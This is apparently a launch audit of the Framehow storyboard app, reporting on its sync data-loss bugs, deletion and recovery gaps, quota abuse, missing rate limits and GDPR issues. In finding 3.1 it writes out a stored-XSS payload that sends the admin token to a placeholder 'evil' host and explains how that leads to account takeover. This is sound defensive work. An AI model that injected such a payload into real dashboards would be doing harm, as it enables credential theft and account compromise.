# Framehow — Launch audit, 9 November 2026

Scope: `src/` (web app), `backend/` (Cloudflare Worker, D1, R2), `ios/` (Capacitor shell), repo housekeeping.
Method: every finding below was verified by reading the code and configuration that ships. Intent described in CLAUDE.md / TOMORROW.md / ACCOUNT_SYNC_SPEC.md was used only for orientation. Nothing was run against the live service; nothing in the Cloudflare dashboard could be inspected (see "Uninspected").

Grades: CRITICAL / HIGH / MEDIUM / LOW. Difficulty: S (hours) / M (a day or two) / L (several days). "Blocks launch" is my judgement for a public launch with real production materials, not for TestFlight with a handful of known testers.

Line numbers are of the files as they stand today.

---

## Summary of the worst

| # | Grade | Finding | Blocks launch |
|---|---|---|---|
| 1 | CRITICAL | A photograph whose upload fails for any reason other than "too large" / "storage full" is skipped, the shot is pushed without it, and the shot is then recorded as fully in sync. The photo exists only on that one device and is never retried. Opening another project destroys the only copy. `src/lib/accountFlow.ts:3165-3166`, `3367-3375`, `6038-6046` | yes |
| 2 | HIGH | Stored XSS in the admin dashboard from the unauthenticated `/track` endpoint; the admin token travels in the URL, so one crafted event hands over `set-password` on every account. `backend/src/routes/analytics.ts:45-80`, `459`, `489-494`, `250-253`, `697-733` | yes |
| 3 | HIGH | Restore on a project whose tree exceeds 900 KB silently skips the "before restore" safety point and then wipes the project's current state. Such projects also get no automatic restore points at all. `backend/src/routes/projects.ts:2047`, `2097-2101`, `1246`, `1256-1259` | yes |
| 4 | HIGH | Deleted shots, versions and replaced pictures are hard-deleted on the server at once; their picture files survive only as long as an automatic restore point (≤ 48 h) and are then purged by the nightly cleaner. The app and Terms imply a longer window. `projects.ts:1866-1895`, `2199-2201`; `backend/src/lib/cleaner.ts:68-74`, `141-180` | yes (for the Terms) |
| 5 | HIGH | A GitHub fine-grained token is embedded in `.git/config` remote URL; the whole folder is rsync-copied to `~/Desktop/Framehow Files/framehow-react-versions/<version>/` on every deploy (`.git` excluded there, but the working copy itself sits in a synced folder). `.git/config` line 10; `scripts/deploy.sh:51-54` | yes (revoke) |
| 6 | HIGH | iOS shell loads the app from `dev.framehow-react.pages.dev`; switching `server.url` to `framehow.com/app` (LAUNCH C1) changes the web origin, and all IndexedDB / localStorage on testers' devices (unsent offline work, photos, session) becomes unreachable. `capacitor.config.ts:12-15`, `ios/App/App/capacitor.config.json:5-8` | yes (do before inviting testers) |
| 7 | MEDIUM | No rate limiting anywhere: sign-up, sign-in, forgot-password (sends mail), `/track` (two D1 writes per call, no auth, no size limits), `/upload`. Cost and abuse exposure on a paid Workers plan. `backend/src/index.ts` (no middleware), `auth.ts`, `analytics.ts:45-80` | no, but fix before public |
| 8 | MEDIUM | Quota accounting trusts client-supplied `size_bytes` when subtracting on delete; a client can zero its own running total (and the global one) and upload without limit until the 03:00 recount. `storage.ts:117-163`, `totals.ts:79-91`, `projects.ts:1656`, `1992-2006` | no |
| 9 | MEDIUM | Sync payload accepts any `r2_key`; ownership of a key is never checked against `users/<me>/`. With a leaked key, another user's picture can be read via `/images/*` and kept alive against the owner's deletion. `projects.ts:1652-1662`; `upload.ts:145-158`; `storage.ts:78-110` | no |
| 10 | MEDIUM | No per-account caps on object count, project count, frame/version count, drawings or "saved" restore points → D1 (10 GB hard limit for the whole database) and R2 operation costs can be exhausted by one account within the 500 MB byte limit. | no |

---

## 1. Offline photographs & synchronisation

### How it actually works (verified)

- Photos live as `data:` URLs in the Zustand store (`frames[].src`, `versions[].bgImage`) and are written to IndexedDB `framehow/state` under the single key `currentProject` by the autosave (2 s debounce) — `src/lib/persistence.ts:12-15`, `150-152`; `src/lib/currentProject.ts:154`, `1007-1067`. `pagehide` and `visibilitychange` force a save — `currentProject.ts:1291-1298`.
- Unsent work is filed per project in the `pending` store, only when a push fails or the project has no cloud id — `persistence.ts:329-344`; `currentProject.ts:545-556`, `657-678`. A successful push archives the record and keeps it 24–72 h — `persistence.ts:357-381`, `392-420`.
- A push uploads each new picture with `POST /upload` (parallel, `Promise.all`), then sends the tree with the returned `r2_key`s — `accountFlow.ts:3126-3185`, `3228-3277`. `r2Key` is written back to the store only after the push succeeds — `accountFlow.ts:3394-3440`.
- Retries: a 40 s timer with growing back-off, `online` event, a reconnect watcher, and at start — `currentProject.ts:735-741`, `810-919`, `1303-1314`. Storage-full stops pushes until space is freed — `currentProject.ts:565-572`, `835`.
- Local save failures (quota) are reported once with a modal — `currentProject.ts:1059-1087`. `navigator.storage.persist()` is requested at boot — `accountFlow.ts:7141`, `persistence.ts:546-554`.
- A pull keeps the local `src` when the server has no picture for that card — `accountFlow.ts:4016`, `4034`.

This is a serious, well-thought-out design. The problems are at its edges.

### VERIFIED issues

**1.1 CRITICAL — A failed picture upload is swallowed and the shot is marked as synced**
Evidence: `accountFlow.ts:3160-3167`:
```ts
console.warn('[sync] image upload failed for version', task.versionId, e);
return null; // Skip failed uploads — structure still syncs
```
Only `image_too_large` (tells the user) and `storage_full` (aborts the save) are handled. Any other failure — connection dropped mid-upload, HTTP 500/502/503, R2 hiccup, Worker CPU timeout, a captive portal returning HTML — falls here. The shot then goes up without an image row. After the push, every frame's fingerprint is recorded as "the server has this" (`3367-3375`), and the fingerprint of a frame with a local `src` and no `r2Key` is stable (`changeStamps.ts:75-79`). So:
- the next push sees the frame as clean (`2717`, `2845`) and never rebuilds `imageUploads` for it;
- `anyShotUnsent()` says no (`6038-6046`); `adoptFingerprintsFromStore()` after any pull re-records it as matching (`5988-5999`);
- the pending record is archived as "uploaded" (`currentProject.ts:612-613`) and swept after 72 h.
Realistic scenario: on set, the iPhone takes 12 photos on a weak connection; two uploads time out. The push returns 200. The desktop shows two empty cards; the iPhone shows all 12 and says nothing. Tomorrow the iPhone user opens another project: `loadCloudProject` flushes (nothing dirty, `currentProject.ts:581-587`), `applyCloudTreeToStore` replaces the store, the autosave overwrites `currentProject`, and the archive is gone within three days. The two photographs no longer exist anywhere.
Fix (S/M): treat any upload failure other than `image_too_large` as a failure of the push (throw, so the pending-copy and retry machinery takes over), or at minimum exclude frames whose picture was not uploaded from `_lastPushedFingerprints` and from `markPendingUploaded`. Add a trace line and a user-visible "N pictures not yet uploaded" indicator. Bench test: upload returns 503 once, then succeeds — the picture must reach the server.
Blocks launch: **yes**.

**1.2 HIGH — Restore on a large project destroys the current state without a way back**
Evidence: `projects.ts:2047` `MAX_SNAPSHOT_BYTES = 900_000`; `2097-2101` returns `null` with a `console.warn` when the tree is bigger; `1246` `await forceCreateSnapshot(c.env.DB, project.id, now, 'pre_restore')` ignores the return value; `1256-1259` then `DELETE FROM strips WHERE project_id = ?` (cascades to frames, versions, images, drawings). The client `performRestore` (`accountFlow.ts:5189-5215`) does not warn either.
A project with a few dozen drawings (each up to 1 MB, `projects.ts:55`) crosses 900 KB easily. The same projects get **no** automatic restore points (`2053-2064`), so for them the server-side recovery window for a deleted shot is zero.
Fix (S): refuse the restore (HTTP 409 with a clear message) when the pre-restore point could not be written; raise the cap or store snapshots in R2 instead of a D1 TEXT column (M). Surface "this project has no restore points because it is too large" in the restore list.
Blocks launch: **yes**.

**1.3 HIGH — Shots, versions and replaced pictures are hard-deleted; recovery is ≤ 48 h, not 7 days**
Evidence: partial sync applies tombstones with `DELETE FROM frames/versions/images/drawings` (`projects.ts:1866-1895`); a new picture on a card upserts `r2_key` over the old (`1995-2001`). The R2 file then survives only while a restore point names it: `thinSnapshots` deletes every non-`saved` point older than 48 h (`2199-2201`); the nightly cleaner deletes any file no row and no restore point names, if older than 24 h (`cleaner.ts:68-74`, `141-180`, called from `index.ts:76-83`). The app says "no 7-day recovery" only for Delete now (`accountFlow.ts:1352`), the project list shows a 7-day window, and the Terms say nothing about shots.
Fix (S): state this plainly in the Terms (B2/D1). Optionally (M): let the cleaner keep files for 7 days after they become unreferenced (store `unreferenced_since` in `deleted_pictures`-style table) so the "7 days" promise holds for everything.
Blocks launch: **yes for the Terms**, no for the code.

**1.4 HIGH — Changing the iOS shell's `server.url` orphans every tester's offline data**
Evidence: `capacitor.config.ts:12-15` and `ios/App/App/capacitor.config.json:5-8` point at `https://dev.framehow-react.pages.dev/app/`. IndexedDB (`framehow`, `framehow-picts`) and localStorage (`fh_session_token`, `fh_session_user`) are origin-scoped. LAUNCH.md C1 plans the switch to `framehow.com/app`.
Scenario: a tester has an unsent project with photos on the iPad. Build 2 ships with the new URL. The app opens empty, signed out; the old origin's data is still on disk but unreachable from the app. Nothing tells the user.
Fix (S): switch the URL **before** inviting any tester (C1 before C4, as LAUNCH.md already orders). Never change it again without a migration step. Consider pinning `framehow.com/app` now.
Blocks launch: **yes** (ordering only).

**1.5 MEDIUM — Concurrent-device edits settle by device clock**
Evidence: `content_changed_at` from the device decides who wins (`projects.ts:1947-1990`, `lib/syncDecide.ts`). A device with a wrong clock silently wins or loses every contest; the server never sanity-checks the stamp against its own time. The code base knows this (#313/#316 fixed the delta side) and conflicts for main frames were deliberately removed (#303).
Fix (M): clamp `content_changed_at` to `server_now` on arrival and log stamps more than a few minutes ahead; keep the design otherwise.
Blocks launch: no.

**1.6 MEDIUM — Non-atomic quota check allows parallel uploads to overshoot**
Evidence: `upload.ts:85-93` reads `userBytes` then writes after the put; the client uploads all pictures of a push in parallel (`accountFlow.ts:3140-3169`). At 495 MB, 20 parallel 9 MB uploads all pass. Bounded (N × 10 MB per push), self-corrects at the nightly recount, but the user then sits above the limit with no path but deletion.
Fix (S): reserve atomically — `UPDATE storage_totals SET bytes = bytes + ? WHERE scope = ? AND bytes + ? <= ?` and refuse when `changes = 0`; release on failure.
Blocks launch: no.

### PLAUSIBLE risks (not provable from code alone)

- **iOS WKWebView storage durability.** `navigator.storage.persist()` is not honoured inside WKWebView; iOS may evict website data under storage pressure, and WebKit's 7-day cap for script-writable storage applies to Safari — its application to a Capacitor shell is version-dependent. An unsent offline project held for weeks on a full iPad could be evicted. Mitigation: show the "unsent work on this device" line prominently; consider a native Capacitor Filesystem mirror of pending photos (M/L).
- **App update while a push is in flight.** The shell loads remote code, so an update is a reload. `pagehide` saves locally (`currentProject.ts:1298`); a half-finished push retries. Pictures uploaded but whose push did not land become dead files (cleaned after 24 h, counted against quota until then) and are re-uploaded under a new key — storage churn, not loss.
- **Single-record snapshot size.** The whole open project (every photo as base64) is one IndexedDB value written every 2 s of idle. On iPad Safari large single values have been observed to fail at a few hundred MB. The quota modal would fire, but only on the first failure.

### UNINSPECTED
- Camera plugin's native capture path (`ios/App/App/FramehowCamera`) — how the JPEG reaches JS and whether a capture can be lost before `onCapturedImage` (`camera.ts:115`).
- The e2e suite's coverage of 1.1 (a 5xx from `/upload`).

---

## 2. Quota & storage costs

### VERIFIED — what is enforced server-side
- Per-picture 10 MB, checked on `Content-Length` and on the buffered body — `upload.ts:13`, `67-77`. Previews 200 KB — `upload.ts:188`, `218`.
- Per-account wall (`STORAGE_LIMIT_MB = "500"`, `wrangler.toml:23`) at the upload door against the running bucket-truth total — `upload.ts:84-93`, `totals.ts:74-76`; and again on sync against image rows — `projects.ts:581-613`.
- Global ceiling 50 GB — `wrangler.toml:19`, `upload.ts:94-103`.
- Nightly recount from the bucket overwrites drift — `totals.ts:112-145`, `index.ts:88-96`. Admin mails at 8 GB, 9 GB, every 250 MB, and nightly — `totals.ts:55-59`, `171-204`.
- Dead files (unreferenced > 24 h) are deleted nightly and freed from the totals — `index.ts:76-83`, `cleaner.ts:141-180`.
- Pending local photos do not count until uploaded (correct); the refusal carries `pending` so the app does not mistake a list answer for free room — `projects.ts:611`, `upload.ts:91`.

### VERIFIED issues

**2.1 MEDIUM — Client-supplied `size_bytes` can drive the running totals to zero**
Evidence: the sync payload's `size_bytes` is trusted when non-null (`projects.ts:1656`, `1992-2006`); `fillImageSizes` fills only nulls (`storage.ts:174-202`). `deleteProjectForGood` sums `i.size_bytes` and calls `addBytes(db, userId, -bytesFreed)` on both the user and the `all` scope (`storage.ts:123-162`, `totals.ts:79-91`, `MAX(0, …)`). A direct API caller sets `size_bytes: 400_000_000` on one row, calls `DELETE /projects/:id/now`, and both the wall and the ceiling read ~0 until 03:00. Legitimate clients send `null` for re-sent pictures, so nothing breaks by ignoring the field.
Fix (S): on delete, size from `bucket.head()` (as `deletePictures` already does, `storage.ts:285-288`) or from the server-recorded upload size; never from the row. Clamp `size_bytes` on sync to the HEAD result.
Blocks launch: no.

**2.2 MEDIUM — Multiple accounts and object-count abuse**
Evidence: sign-up needs only an unverified e-mail (`auth.ts:48-152`; verification not sent, `email.ts:125-131`), so the per-account limit is trivially multiplied; the global 50 GB ceiling caps the storage bill (~$0.60/month) but nothing caps:
- object count (1-byte uploads pass the byte wall for ever; each is an R2 Class A op, and `/user/pictures` lists the whole prefix every time the library opens — `user.ts:25-59`),
- projects, frames, versions, drawings (1 MB each, `projects.ts:55`), `saved` restore points (900 KB each, kept for ever — `projects.ts:1186-1189`, `2142-2149`),
- `/track` rows (unauthenticated, unbounded field sizes — `analytics.ts:45-80`).
D1 has a hard 10 GB per-database limit; filling it stops every user. Worker requests and D1 row writes are billed on the paid plan.
Fix (S/M): minimum picture size (e.g. 1 KB) and a per-account object cap (e.g. 5,000) checked at the upload door from a count scope in `storage_totals`; cap projects per account (e.g. 200), frames per project (e.g. 2,000), `saved` points per project (e.g. 20); cap `/track` body at 2 KB and field lengths; cap `heartbeat` `device_name` (`projects.ts:230-235`, unbounded).
Blocks launch: no.

**2.3 LOW — Shown figure vs. enforced figure differ**
`sumUserImageBytes` (what the app shows) excludes deleted-but-recoverable projects (`storage.ts:46-68`), while the upload wall counts every file under the prefix, including those and dead files for up to 24 h. A user can see "300 of 500 MB" and still be refused. The refusal body carries the true `used`, so the app recovers, but the message is confusing.
Fix (S): show `userBytes` (bucket truth) in `storageFigure`.

### UNINSPECTED
- Cloudflare dashboard: billing notifications, Workers plan limits, D1 size today, whether R2 and D1 are in the EU jurisdiction.

---

## 3. Privacy & access control

### Route inventory (every handler in `backend/src`)

| Route | Auth | Authorisation | File:line |
|---|---|---|---|
| `GET /`, `GET /healthz` | none | — | `index.ts:28-29` |
| `POST /auth/signup` | none | — | `auth.ts:48` |
| `POST /auth/login` | none | — | `auth.ts:157` |
| `POST /auth/logout` | bearer optional | deletes own session by hash | `auth.ts:225` |
| `POST /auth/forgot-password` | none | — (sends mail) | `auth.ts:237` |
| `POST /auth/reset-password` | none | token hash, single use, 1 h | `auth.ts:287` |
| `GET /auth/verify-email` | none | token hash | `auth.ts:367` |
| `GET /user/pictures` | `requireUser` | own prefix `users/<id>/` + own projects | `user.ts:16`, `25` |
| `POST /user/pictures/delete` | `requireUser` | keys filtered to own prefix | `user.ts:78`; `storage.ts:279` |
| `GET/PUT /user/me`, `PUT /user/password`, `DELETE /user/me` | `requireUser` | self | `user.ts:92-224` |
| `GET /projects`, `POST /projects` | `requireUser` | own rows | `projects.ts:58`, `64`, `88` |
| `GET/PUT/DELETE /projects/:id` | `requireUser` | `loadOwnedProject` (owner, not deleted) | `projects.ts:116-166`; `lib/auth.ts:248-262` |
| `POST /projects/:id/recover` | `requireUser` | owner + deleted | `projects.ts:171` |
| `DELETE /projects/:id/now` | `requireUser` | owner (live or deleted) | `projects.ts:193` |
| `GET /projects/:id/status` | `requireUser` | owner in SQL | `projects.ts:212` |
| `POST /projects/:id/heartbeat` | `requireUser` | owner in `UPDATE … WHERE user_id` | `projects.ts:227` |
| `GET/POST /projects/:id/sync` | `requireUser` | `loadOwnedProject`; 410 for own deleted | `projects.ts:297`, `319` |
| `GET/POST /projects/:id/conflicts[/:cid]` | `requireUser` | `loadOwnedProject` + `project_id` on conflict | `projects.ts:775`, `807` |
| `GET/POST /projects/:id/setting-conflicts[/:cid]` | `requireUser` | same | `projects.ts:1035`, `1058` |
| `GET/POST /projects/:id/snapshots`, `DELETE …/:sid` | `requireUser` | `loadOwnedProject` + `project_id` | `projects.ts:1144`, `1171`, `1215` |
| `POST /projects/:id/restore/:sid` | `requireUser` | `loadOwnedProject` + `project_id` | `projects.ts:1229` |
| `POST /upload` | `requireUser` | writes under own prefix | `upload.ts:52`, `105` |
| `GET /images/*` | `requireUser` | key must be on an image row of an own, live project | `upload.ts:129`, `145-158` |
| `PUT/GET /thumbs/*` | `requireUser` | key must start with `users/<me>/` | `upload.ts:190-197`, `210`, `236` |
| `POST /track` | **none** | — | `analytics.ts:45` |
| `GET /analytics/summary`, `/analytics/users` | admin bearer | — | `analytics.ts:85`, `122` |
| `GET /analytics`, `/funnel`, `/user/:uid`, `/session/:sid`, `/users-list`, `/deleted-users`, `/projects`, `/device-users`, `/browser-mobile`, `/storage`, `/dead-pictures` | admin **`?token=` query** | — | `analytics.ts:147-1151` |
| `POST /analytics/set-password`, `/recount`, `/restore-account`, `/dead-pictures/delete` | admin token in form body | — | `analytics.ts:697`, `1112`, `1123`, `1196` |
| `POST /admin/cleanup/expired-projects`, `GET /admin/cleanup/preview` | admin bearer | — | `cleanup.ts:24`, `35` |

Every user-data route checks authentication and ownership. R2 is reached only through the Worker with the `IMAGES_BUCKET` binding; there are no public bucket URLs and no signed URLs in the code base (so nothing to expire). `/images/*` responses are `Cache-Control: private` (`upload.ts:167`). CORS is restricted to owned origins and `localhost` (`cors.ts:112-144`).

### VERIFIED issues

**3.1 HIGH — Stored XSS in the admin dashboard via the public `/track` endpoint → admin token → any account**
Evidence: `/track` stores `event` and `meta` verbatim, no auth, no length or shape validation (`analytics.ts:45-80`). The dashboard renders `${e.event}` unescaped in "Top events" (`analytics.ts:489`, `493`) and `signpostCounts` labels built from `meta.choice` unescaped (`analytics.ts:107-108` of the handler, rendered at `459`). The dashboard is authenticated by `?token=` in the URL (`250-253`) so `location.search` holds the admin secret. With it, `POST /analytics/set-password` (`697-733`) sets any user's password and returns it; the attacker then signs in as that user and downloads every storyboard. `set-password` also deletes all sessions, so the victim notices only after the fact.
Scenario: one `sendBeacon` with `event: "<img src=x onerror=fetch('https://evil/'+location.search)>"`; Roman opens the nightly dashboard.
Fix (S): `esc()` every interpolation (events, meta keys, uids in hrefs); whitelist event names (`/^[a-z_]{1,40}$/`), cap `meta` at 1 KB; move the admin token out of the URL (cookie set once, or `Authorization` via a tiny login form) and add a `Content-Security-Policy` header on `/analytics*`.
Blocks launch: **yes**.

**3.2 HIGH — GitHub token in the git remote URL**
Evidence: `.git/config` line 10, `url = https://github_pat_…@github.com/RomanValentFilm/framehow-react.git` (93-character fine-grained PAT). Not committed, but it lives in the working copy inside "Framehow Files", which the deploy script mirrors to the Desktop (`scripts/deploy.sh:51-54`; `.git` is excluded from that copy, but the source folder itself is what was handed to this audit). LAUNCH.md F1 already lists it.
Fix (S): revoke on GitHub now; use `gh auth login` / the macOS keychain credential helper or SSH; `git remote set-url origin https://github.com/RomanValentFilm/framehow-react.git`.
Blocks launch: **yes** (five minutes).

**3.3 MEDIUM — `r2_key` ownership is not validated on sync or restore**
Evidence: `parseSyncPayload` accepts any non-empty string (`projects.ts:1652-1662`); the image upsert stores it (`1992-2006`). `/images/*` then grants access to whoever has a row joining to an own project (`upload.ts:145-158`). `keysNamedElsewhere` treats a key named by *any* project as shared (`storage.ts:78-110`), so an attacker's row also keeps the victim's file alive through the victim's "Delete now". Keys are random UUIDs under `users/<victimId>/`, so this needs a leak (a shared export, a log, a screenshot of the library's trace) — but once leaked it is a permanent read.
Fix (S): in `parseSyncPayload`, reject `r2_key` not starting with `users/${me.id}/` (pass `me.id` in); same check in `appendLosingVersions` and restore.
Blocks launch: no.

**3.4 MEDIUM — No rate limiting on authentication and mail-sending routes**
Evidence: no middleware in `index.ts`; `auth.ts` has none; `forgot-password` sends a mail per call (`auth.ts:260-275`); sign-up sends a welcome mail per call and the `await` on line 145 means a slow mail provider slows sign-up. Credential stuffing against `/auth/login` is limited only by PBKDF2 CPU (100 k iterations, `crypto.ts:4`). Password resets never expire from the table (`password_resets` has no sweep).
Fix (S): Cloudflare WAF rate-limiting rules (dashboard): `/auth/*` 10/min per IP, `/auth/forgot-password` 3/10 min per IP, `/track` 60/min per IP, `/upload` 120/min per user token hash; optionally Turnstile on sign-up (M). Fire-and-forget the welcome mail with `waitUntil`.
Blocks launch: no, but do before public sign-up is advertised.

**3.5 LOW — Email-verification token echoed to the client in production**
Evidence: `auth.ts:41-43` returns `dev_token` whenever `EMAIL_API_KEY` is unset; `types.ts:85-87` says that secret is obsolete, so in production it is almost certainly unset and every sign-up response contains the verification token. Harmless today because verification gates nothing, but `email_verified` becomes meaningless the day it does.
Fix (S): gate on `FH_E2E === "1"` like the reset echo (`auth.ts:278`).

**3.6 LOW — Admin token comparisons and transport**
`token === c.env.ADMIN_API_TOKEN` (`cleanup.ts:12`, `analytics.ts` throughout) — not constant-time (irrelevant at this scale), but the token in the query string lands in browser history and Cloudflare request logs. Covered by 3.1's fix.

**3.7 LOW — No Content-Security-Policy on the app; session in localStorage**
`public/_headers` sets only `Cache-Control` for `sw.js`. Project names and labels are rendered through `innerHTML` in places (`accountFlow.ts:5046`, `5101`, …) — self-XSS only, since a user sees only their own data, but a CSP would also contain 3.1-class mistakes.
Fix (S): `_headers` with `Content-Security-Policy: default-src 'self'; connect-src 'self' https://framehow-api.roman-cbd.workers.dev; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com`.

**3.8 LOW — File type is taken from the header, not the bytes**
`upload.ts:62-65` trusts `Content-Type`. Served back with the same type to the owner only, so no cross-user exposure; SVG/HTML are not in the allow-list. Fine for now; a magic-byte check is S if wanted.

**3.9 LOW — Local copies survive logout**
`clearSession`/logout do not clear IndexedDB (`accountFlow.ts:2080-2089`; `session.ts:174-181`). On a shared iPad the next user sees the previous user's "on this device" copies (with photos) in the project list. Cross-account upload is prevented by the server (404 → parked, `accountFlow.ts:1947-1960`).
Fix (S): tag pending records with `userId` and hide/sweep foreign ones; offer "remove local copies" on logout.

### Account deletion completeness — VERIFIED
- `DELETE /user/me`: soft-deletes user and projects, deletes sessions (`user.ts:209-224`). The app text says "permanently deleted… cannot be undone" (`accountFlow.ts:2091-2093`) — not true for 7 days (admin can restore, `analytics.ts:1123-1149`).
- Cron after 7 days: files of every project (unless named by another project of the same user — impossible after deletion, but `keysNamedElsewhere` also looks at *other users'* rows, see 3.3), then everything under `users/<id>/`, analytics events and sessions by `uid`, storage totals, `deleted_pictures`, the user row (cascade: sessions, password_resets, project_members, projects → strips/frames/versions/images/drawings/snapshots/settings) — `cleanup.ts:80-141`. `project_deletions` rows are removed per project first (`storage.ts:153-156`).
- Left behind: anonymous `analytics_events` rows from before login (by `sid`, no uid); Worker logs containing e-mail addresses (`email.ts:48`, `52`) for Cloudflare's log retention; D1 Time Travel history (platform, up to 30 days on paid plans).

---

## 4. Abuse prevention

VERIFIED facts: no e-mail verification (by decision, `email.ts:125-131`); no captcha; no rate limits in code; sign-up issues a session at once (`auth.ts:127-140`); passwords 8–200 chars, PBKDF2-SHA256 100 k (`crypto.ts:4`, `auth.ts:16-17`); sessions 30 days sliding (`lib/auth.ts:215-226`); reset tokens hashed, single-use, 1 h (`auth.ts:309-321`); welcome/reset mail through the Cloudflare `send_email` binding (`wrangler.toml:33-34`).

Cost controls that exist: 10 MB/picture, 500 MB/account, 50 GB global, nightly recount and mails to `roman@valentfilm.com` (`wrangler.toml:28`), dead-file cleaner. These control **storage** cost only.

### VERIFIED issues
- **4.1 MEDIUM — Request/row flooding has no brake and no alert.** `/track` costs two D1 writes per anonymous call (`analytics.ts:57-76`); `/healthz`, `/auth/*`, `/upload` are open to any volume. The Workers Paid plan bills requests, D1 rows read/written, R2 Class A/B ops; none of these is monitored by the code. Fix: WAF rate-limit rules (S, dashboard), Cloudflare billing notifications (S, dashboard), and a line in the nightly mail with yesterday's request count from the GraphQL analytics API (M). The 50 GB storage brake is good; add the same idea for D1 size (refuse sync when `PRAGMA page_count`-based size > 8 GB, M).
- **4.2 MEDIUM — Mail bombing.** Anyone can trigger a welcome mail to any address (`auth.ts:145`) and unlimited reset mails (`auth.ts:275`). Besides cost and reputation (DKIM is F2 in LAUNCH.md), a flood gets `info@framehow.com` blacklisted. Fix: rate limits above; one outstanding reset per user (`UPDATE … used_at` old ones, S).
- **4.3 LOW — Fake accounts are cheap.** Bounded financially by the ceiling; unbounded in D1 rows. Turnstile on sign-up (M) when the public page goes up.

### UNINSPECTED
Cloudflare WAF / rate-limiting rules, Bot Fight Mode, billing alerts, Workers plan — all dashboard-side.

---

## 5. Recovery & GDPR

### Deletion inventory (VERIFIED)

| Delete path | Trigger | Soft or hard | Recovery window & who | D1 rows | R2 object actually removed | Notes |
|---|---|---|---|---|---|---|
| Project — Delete | `DELETE /projects/:id` (`projects.ts:155-166`) | Soft (`deleted_at`) | 7 days from `deleted_at`; user via Recover (`171-185`) and list (`64-83`) | kept | Cron at 03:00 UTC, first run after `deleted_at` + 7 d → day 7–8 (`index.ts:60`, `cleanup.ts:144-175`, `storage.ts:117-163`), unless another own project or a live project's restore point names the key | Storage figure stops counting it in the app, but the upload wall still counts the files (2.3) |
| Project — Delete now | `DELETE /projects/:id/now` (`193-206`) | Hard | none | project + cascade, `project_deletions` | immediately, same "named elsewhere" exception | Also removes the device copies (`accountFlow.ts:644-645`) |
| Shot (frame) deleted | tombstone in sync (`1866-1883`, `2020-2036`) | Hard on server; tombstone row kept for ever (`1369-1372` says 30 d, no sweep exists) | Restore point ≤ 48 h (`2199-2201`) if project < 900 KB; device archive 24–72 h (`persistence.ts:357-358`) | frame, versions, images, drawings deleted | Nightly cleaner once no snapshot names it and file > 24 h old (`cleaner.ts:68-74`) → typically 2–3 days | Restore is whole-project, not per shot |
| Version deleted | tombstone (`1884-1894`) | Hard | same as shot | version, image, drawing | same | |
| Picture replaced on a card | image upsert (`1995-2001`) | Hard (old key dropped) | same as shot | row updated | same | Not a visible "delete" |
| Picture — library Delete | `POST /user/pictures/delete` (`user.ts:78-89`, `storage.ts:276-307`) | Hard | none (`deleted_pictures` blocks resurrection for ever, `projects.ts:585-591`) | `images.deleted_at` set, `size_bytes = 0`; `deleted_pictures` row | immediately, file + preview | Restore points still name the key → restore gives a card whose picture 404s (`accountFlow.ts:2453`) |
| Restore to a point | `POST /projects/:id/restore/:sid` (`1229-1330`) | Hard replace of current state | `pre_restore` point, **skipped silently if tree > 900 KB** (1.2) | strips cascade-deleted, re-inserted | none (files kept by the new point) | |
| Restore point — automatic | `thinSnapshots` (`2132-2208`) | Hard | — | snapshot row | — | Everything not `saved` gone after 48 h |
| Restore point — saved | `DELETE /projects/:id/snapshots/:sid` (`1215-1224`) | Hard | none | row | — | Only `reason = 'saved'` deletable by user; kept for ever otherwise |
| Offline copy on device | `deletePending` (`persistence.ts:477-482`) | Soft (`deletedAt`) | 24 h, user via Edit mode (`522-531`) | — | — | Sweep `392-420` |
| Account | `DELETE /user/me` (`user.ts:209-224`) | Soft | 7 days, **admin only** (`analytics.ts:1123-1149`); e-mail reserved meanwhile (`auth.ts:86-101`) | all projects soft-deleted; sessions deleted | Cron after 7 d: every object under `users/<id>/` (`cleanup.ts:108-118`) | App text says "cannot be undone" |
| Dead files | nightly / admin button (`index.ts:76-83`, `analytics.ts:1196`) | Hard | none | — | yes | 24 h grace; counts dead files toward quota meanwhile |

**Backups / versioning:** there is no backup code, no R2 object versioning (R2 does not offer it), no export of D1. D1 Time Travel (Cloudflare platform, 30 days on the paid plan) can roll the *database* back but cannot bring back an R2 object the cleaner deleted — a rolled-back `images` row would point at nothing. The Privacy Policy's "temporary backup copies may remain" (`site/public/privacy.html:26`) describes something that does not exist; the honest statement is "deleted data is not backed up".

### Data-processing inventory (VERIFIED from schema and code)

| Data | Where | Evidence |
|---|---|---|
| Name, e-mail, profession, password hash, terms-agreed time, verification token hash | D1 `users` | `migrations/0001:9-24`, `0029` |
| Session token hash + **full User-Agent** | D1 `sessions.device_info` | `auth.ts:133`, `200` |
| Device id and device name (user-chosen or OS name) per project | D1 `projects.last_device_*`, `heartbeat_*` | `0005`, `0008` |
| Project names, shot labels, notes, text, tables, drawings, scribbles, needs/notes/setups, sort orders, export header fields | D1 `projects.metadata`, `frames`, `versions`, `drawings`, `project_settings`, `project_snapshots.tree_json` | `projects.ts:1338-1367`, `3096-3119` |
| Photographs and previews | R2 `framehow-storage` under `users/<id>/` | `upload.ts:105`, `229` |
| Analytics: event name, session id, device class, browser, PWA flag, **country (cf-ipcountry)**, user id, event meta (includes project names: `fhTrack('project_opened', { name })`) | D1 `analytics_events`, `analytics_sessions` | `analytics.ts:52-76`; `accountFlow.ts:1524`, `1564` |
| E-mail addresses in Worker logs | Cloudflare Workers logs | `email.ts:38`, `48`, `52`; `upload.ts:88` (user ids) |
| Admin mail content: top-5 account ids by size | mail to `roman@valentfilm.com` | `totals.ts:194-203` |
| Fonts | Google Fonts `@import` (client IP to Google) | `src/styles/globals.css:1`, `globals_v3.4.css:1` |

Processor: Cloudflare (Workers, D1, R2, Email Sending). Region: **unknown from the repo** — no `location_hint` / jurisdiction for D1 or R2 in `wrangler.toml`; set at creation in the dashboard. Controller per imprint: Tinge Films s.r.o., Prague (`site/public/imprint.html`) → GDPR applies.

### Items needing legal review (flag for D1/D2 in LAUNCH.md)
1. Terms/Privacy must describe the real behaviour: project 7–8 days recoverable; shots/versions/replaced pictures recoverable ≤ 48 h via whole-project restore only; library delete and Delete now immediate; account 7 days admin-only recovery; **no backups**.
2. The in-app account-deletion text ("permanently… cannot be undone") contradicts the 7-day admin restore; pick one.
3. Admin ability to set a user's password and read all users' e-mails/names (`analytics.ts:697-733`) — document as support access; consider logging and a second factor.
4. Analytics without consent banner: country + device + usage per identified user. Likely defensible as legitimate interest for a logged-in product, but must be in the Privacy Policy; `cf-ipcountry` and User-Agent storage should be named.
